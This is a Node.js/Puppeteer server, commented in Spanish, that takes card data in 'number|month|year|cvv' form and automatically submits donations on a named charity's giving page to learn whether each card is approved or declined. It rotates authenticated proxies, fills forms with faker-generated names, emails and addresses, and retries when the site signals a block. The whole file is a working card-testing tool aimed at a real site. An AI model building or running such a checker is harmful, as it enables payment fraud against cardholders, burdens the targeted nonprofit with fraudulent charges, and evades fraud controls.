require('dotenv').config();
const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');
const { faker } = require('@faker-js/faker');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const PROXY_STRING = process.env.PROXY_STRING || '';
const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
const HEADLESS = process.env.HEADLESS === 'false' ? false : 
                 process.env.HEADLESS === 'new' ? 'new' : true;
let browser = null;
let page = null;

// ---------- Proxy ----------
function parseProxy(proxyStr) {
    if (!proxyStr) return null;
    const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
    if (match) {
        return {
            username: match[1],
            password: match[2],
            host: match[3],
            port: parseInt(match[4], 10)
        };
    }
    return null;
}

async function getNewPage() {
    if (browser) {
        await browser.close();
    }
    const proxyData = parseProxy(PROXY_STRING);
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-software-rasterizer'
    ];
    if (proxyData) {
        args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
    }

    // Asegurar que el modo headless se pase correctamente
    const launchOptions = {
        headless: HEADLESS,
        args: args,
        ignoreHTTPSErrors: true
    };

    // Si HEADLESS es 'new', no necesitamos --headless flag, pero añadimos para seguridad
    if (HEADLESS === 'new') {
        args.push('--headless=new');
    }

    try {
        browser = await puppeteer.launch(launchOptions);
    } catch (error) {
        console.error('❌ Error al lanzar Chromium:', error.message);
        console.error('Args:', args);
        throw error;
    }

    page = await browser.newPage();

    if (proxyData) {
        await page.authenticate({
            username: proxyData.username,
            password: proxyData.password
        });
    }

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    return page;
}
// ---------- Generar dirección (fijando estado CO) ----------
function generarDireccion() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const fullName = `${firstName} ${lastName}`;
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
    const street = faker.location.streetAddress();
    const city = faker.location.city();
    const state = 'CO'; // Fijo para simplificar
    const zip = faker.location.zipCode('#####');
    return {
        firstName,
        lastName,
        fullName,
        email,
        street,
        city,
        state,
        zip
    };
}

// ---------- Esperar selector con timeout ----------
async function waitForSelector(page, selector, timeout = 30000) {
    try {
        await page.waitForSelector(selector, { timeout, visible: true });
        return true;
    } catch (e) {
        console.log(`Selector no encontrado: ${selector}`);
        return false;
    }
}

// ---------- Función principal de verificación ----------
async function verificarTarjeta(cardData, amount) {
    // cardData: "numero|mes|año|cvv"
    const [numero, mes, año, cvv] = cardData.split('|');
    const direccion = generarDireccion();

    // Ajustar mes/año para el formato MM/YY (por si vienen como 05/2029 o 05/29)
    const mesFormateado = mes.padStart(2, '0');
    const añoCorto = año.slice(-2);
    const expira = `${mesFormateado}/${añoCorto}`;

    let intentos = 0;
    let ultimoError = '';

    while (intentos < 3) {
        try {
            const page = await getNewPage();
            console.log(`🔍 Navegando a ${TARGET_URL}... (intento ${intentos+1})`);

            // 1. Ir a la página
            await page.goto(TARGET_URL, { waitUntil: 'networkidle2', timeout: 60000 });

            // 2. Llenar monto
            const montoSelector = '#rock-numberbox-c953fc55-c9b0-404b-a52a-929ee9424439';
            if (await waitForSelector(page, montoSelector, 15000)) {
                await page.click(montoSelector, { clickCount: 3 });
                await page.type(montoSelector, amount);
            } else {
                throw new Error('No se encontró el campo de monto');
            }

            // 3. Seleccionar método de pago "Card" si no está activo
            const cardBtn = '[data-cy="payment-type-card-btn"]';
            if (await waitForSelector(page, cardBtn)) {
                const isActive = await page.$eval(cardBtn, el => el.classList.contains('active'));
                if (!isActive) {
                    await page.click(cardBtn);
                }
            } else {
                // Intentar por texto
                await page.click('text=Card').catch(() => {});
            }

            // Esperar que aparezcan los campos de tarjeta (pueden estar en iframe)
            // Buscar en todos los frames
            const frames = page.frames();
            let cardFrame = null;
            for (const f of frames) {
                try {
                    if (await f.$('input.cc-input') || await f.$('input[placeholder*="Card Number"]')) {
                        cardFrame = f;
                        break;
                    }
                } catch (e) {}
            }
            const target = cardFrame || page;

            // 4. Rellenar número de tarjeta
            const numSel = 'input.cc-input, input[placeholder*="Card Number"]';
            if (await waitForSelector(target, numSel, 10000)) {
                await target.click(numSel);
                await target.type(numSel, numero);
            } else {
                throw new Error('No se encontró el campo de número de tarjeta');
            }

            // 5. Fecha de expiración
            const expSel = 'input.exp-input, input[placeholder*="MM/YY"]';
            if (await waitForSelector(target, expSel, 5000)) {
                await target.click(expSel);
                await target.type(expSel, expira);
            } else {
                throw new Error('No se encontró el campo de fecha');
            }

            // 6. CVV
            const cvvSel = 'input.cvv-input, input[placeholder*="CVV"]';
            if (await waitForSelector(target, cvvSel, 5000)) {
                await target.click(cvvSel);
                await target.type(cvvSel, cvv);
            } else {
                throw new Error('No se encontró el campo CVV');
            }

            // 7. Rellenar datos personales y dirección (en la página principal, fuera del iframe)
            // Nombre
            const firstNameSel = '#rock-textbox-a991fa77-baf9-451f-a367-00f5ec7ca436, input[data-cy="person-firstname-input"]';
            if (await waitForSelector(page, firstNameSel)) {
                await page.click(firstNameSel);
                await page.type(firstNameSel, direccion.firstName);
            } else {
                throw new Error('No se encontró el campo First Name');
            }

            const lastNameSel = '#rock-textbox-a3d9aba8-9287-478a-8b6c-469967e3982a, input[data-cy="person-lastname-input"]';
            if (await waitForSelector(page, lastNameSel)) {
                await page.click(lastNameSel);
                await page.type(lastNameSel, direccion.lastName);
            } else {
                throw new Error('No se encontró el campo Last Name');
            }

            const emailSel = '#rock-textbox-dd894906-0601-42c5-8d15-f847e289e6aa, input[data-cy="person-email-input"]';
            if (await waitForSelector(page, emailSel)) {
                await page.click(emailSel);
                await page.type(emailSel, direccion.email);
            } else {
                throw new Error('No se encontró el campo Email');
            }

            const addressSel = '#rock-textbox-4a7d37af-6794-4414-98e5-81ca82d01c29, input[autocomplete="address-line1"]';
            if (await waitForSelector(page, addressSel)) {
                await page.click(addressSel);
                await page.type(addressSel, direccion.street);
            } else {
                throw new Error('No se encontró el campo Address Line 1');
            }

            // Address Line 2 lo dejamos vacío (no es obligatorio)
            // City
            const citySel = '#rock-textbox-2caf2e9a-8672-4e5d-aa73-1eb6d61827c2, input[autocomplete="address-level2"]';
            if (await waitForSelector(page, citySel)) {
                await page.click(citySel);
                await page.type(citySel, direccion.city);
            } else {
                throw new Error('No se encontró el campo City');
            }

            // Estado: seleccionar CO del dropdown
            // El dropdown tiene un input oculto y un span con el valor seleccionado
            // Vamos a hacer clic en el selector para abrir el dropdown, luego buscar la opción CO
            // Primero identificar el contenedor del dropdown
            const stateDropdown = '.ant-select-selector'; // selector del contenedor
            if (await waitForSelector(page, stateDropdown)) {
                // Hacer clic para abrir
                await page.click(stateDropdown);
                // Esperar que aparezca la lista de opciones
                await page.waitForSelector('.ant-select-item-option', { timeout: 5000 });
                // Hacer clic en la opción que contenga "CO" (exacto)
                const option = await page.$('.ant-select-item-option[title="CO"]');
                if (option) {
                    await option.click();
                } else {
                    // Buscar por texto
                    await page.click('.ant-select-item-option:has-text("CO")');
                }
            } else {
                throw new Error('No se encontró el dropdown de estado');
            }

            // Zip
            const zipSel = '#rock-textbox-033d95e6-f607-49c6-a191-f9ba42875daf, input[autocomplete="postal-code"]';
            if (await waitForSelector(page, zipSel)) {
                await page.click(zipSel);
                await page.type(zipSel, direccion.zip);
            } else {
                throw new Error('No se encontró el campo Zip');
            }

            // 8. Hacer clic en "Review Details"
            const reviewBtn = '[data-cy="payment-save-btn"]';
            if (await waitForSelector(page, reviewBtn)) {
                await page.click(reviewBtn);
                await page.waitForTimeout(2000);
            } else {
                throw new Error('No se encontró el botón Review Details');
            }

            // 9. Verificar si aparece "UNABLE TO PROCESS"
            const unableText = await page.evaluate(() => document.body.innerText.includes('UNABLE TO PROCESS'));
            if (unableText) {
                console.log('⚠️ UNABLE TO PROCESS detectado, reintentando...');
                intentos++;
                ultimoError = 'UNABLE TO PROCESS';
                continue; // reintentar con nueva página (proxy)
            }

            // 10. Hacer clic en "Give $X.XX"
            const giveBtn = '[data-cy="review-submit-btn"]';
            if (await waitForSelector(page, giveBtn)) {
                await page.click(giveBtn);
                await page.waitForTimeout(3000);
            } else {
                throw new Error('No se encontró el botón de envío');
            }

            // 11. Evaluar resultado final
            const bodyText = await page.evaluate(() => document.body.innerText);
            if (bodyText.includes('Thank You')) {
                const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot };
            } else if (bodyText.includes('GIFT FAILED') || bodyText.includes('Please verify your payment information')) {
                return { resultado: 'declined', mensaje: 'GIFT FAILED - Verifique datos' };
            } else {
                return { resultado: 'error', mensaje: 'Respuesta desconocida' };
            }

        } catch (error) {
            console.error('Error en verificación:', error);
            ultimoError = error.message;
            intentos++;
        }
    }

    return { resultado: 'error', mensaje: `Falló tras 3 intentos: ${ultimoError}` };
}

// ---------- Endpoints ----------
app.post('/api/check-card', async (req, res) => {
    const { card, amount } = req.body;
    if (!card || !amount) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    try {
        const resultado = await verificarTarjeta(card, amount);
        res.json(resultado);
    } catch (e) {
        console.error('Endpoint error:', e);
        res.status(500).json({ resultado: 'error', mensaje: e.message });
    }
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`🚀 Nirvana backend corriendo en puerto ${PORT}`);
});